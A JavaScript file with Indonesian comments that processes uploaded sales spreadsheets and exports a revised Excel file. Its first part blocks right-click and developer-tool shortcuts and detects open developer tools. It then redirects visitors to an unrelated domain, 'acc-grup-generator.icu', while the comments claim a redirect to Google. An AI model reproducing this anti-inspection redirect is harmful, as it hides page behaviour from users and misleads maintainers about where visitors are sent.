// Mencegah klik kanan
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    alert("Right-click is disabled!");
});

// Mencegah semua shortcut untuk Developer Tools
document.addEventListener('keydown', function(event) {
    // F12
    if (event.keyCode === 123) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + I (Windows/Linux) - Developer Tools
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 73) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + I (Mac) - Developer Tools
    else if (event.metaKey && event.keyCode === 73 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + J (Windows/Linux) - Developer Tools Console
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 74) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + J (Mac) - Developer Tools Console
    else if (event.metaKey && event.keyCode === 74 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + C (Windows/Linux) - Inspect Element
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 67) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + C (Mac) - Inspect Element
    else if (event.metaKey && event.keyCode === 67 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + U (Windows/Linux) - View Source
    else if ((event.ctrlKey || event.metaKey) && event.keyCode === 85) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + U (Mac) - View Source
    else if (event.metaKey && event.keyCode === 85 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + F (Windows/Linux) - Open "Find" bar
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 70) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + F (Mac) - Open "Find" bar
    else if (event.metaKey && event.keyCode === 70 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + D (Windows/Linux) - Developer Tools Dock
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 68) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + D (Mac) - Developer Tools Dock
    else if (event.metaKey && event.keyCode === 68 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // F1 (Help) - Biasanya digunakan untuk membuka Help, seringkali membuka Developer Tools
    else if (event.keyCode === 112) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + E (Windows/Linux) - Network Tab in Developer Tools
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 69) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + E (Mac) - Network Tab in Developer Tools
    else if (event.metaKey && event.keyCode === 69 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + M (Windows/Linux) - Device Mode Toggle
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 77) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + M (Mac) - Device Mode Toggle
    else if (event.metaKey && event.keyCode === 77 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
});

// Menangani deteksi Developer Tools dengan perubahan ukuran jendela
let devToolsOpen = false;

function checkWindowSize() {
    // Tentukan ambang batas perbedaan ukuran untuk mendeteksi Developer Tools
    const threshold = 160;
    const windowWidthDifference = window.outerWidth - window.innerWidth;
    const windowHeightDifference = window.outerHeight - window.innerHeight;

    // Jika perbedaan ukuran lebih besar dari threshold, itu mungkin berarti Developer Tools terbuka
    if (windowWidthDifference > threshold || windowHeightDifference > threshold) {
        if (!devToolsOpen) {
            devToolsOpen = true;
            window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke halaman lain
        }
    } else {
        devToolsOpen = false;
    }
}

// Mengecek perubahan ukuran jendela setiap 500ms
setInterval(checkWindowSize, 500);




async function processFiles() {
  const protectedFile = document.getElementById('protectedFile').files[0];
  const salesFile = document.getElementById('salesFile').files[0];

  if (!protectedFile || !salesFile) {
    alert('Harap upload kedua file terlebih dahulu.');
    return;
  }

  const protectedItems = await readProtectedItems(protectedFile);
  const salesData = await readSalesData(salesFile);

  updateSalesData(salesData, protectedItems);
  exportToExcel(salesData);
}

async function readProtectedItems(file) {
  const data = await file.arrayBuffer();
  const workbook = XLSX.read(data, { type: 'array' }); // Menggunakan 'array' untuk ArrayBuffer
  const sheet = workbook.Sheets[workbook.SheetNames[0]];
  const rows = XLSX.utils.sheet_to_json(sheet, { header: 1 });
  return rows.flat();  // Mengambil daftar nama item
}

async function readSalesData(file) {
  const data = await file.arrayBuffer();
  const workbook = XLSX.read(data, { type: 'array' }); // Menggunakan 'array' untuk ArrayBuffer
  const sheet = workbook.Sheets[workbook.SheetNames[0]];
  return XLSX.utils.sheet_to_json(sheet, { header: 1 });
}

function updateSalesData(data, protectedItems) {
  for (let i = 1; i < data.length; i++) {
    const row = data[i];
    const itemName = row[3]; // Kolom ITEMOVDESC

    if (itemName && itemName.includes('(PACKAGE)') && !protectedItems.includes(itemName)) {
      row[3] = `--${itemName}`; // Tambah tanda "--"

      let j = i - 1;
      while (j >= 0 && data[j][3] && data[j][3].startsWith('--')) {
        j--; // Naik ke baris di atas
      }

      if (j >= 0 && data[j][0]) {
        row[4] = data[j][0]; // Set kolom GROUPSEQ sesuai dengan KeyID baris di atas
      }
    }
  }
}

function exportToExcel(data) {
  const ws = XLSX.utils.aoa_to_sheet(data);
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, ws, 'Processed Sales Data');
  XLSX.writeFile(wb, '[FINAL] DATA PENJUALAN.xlsx');
}
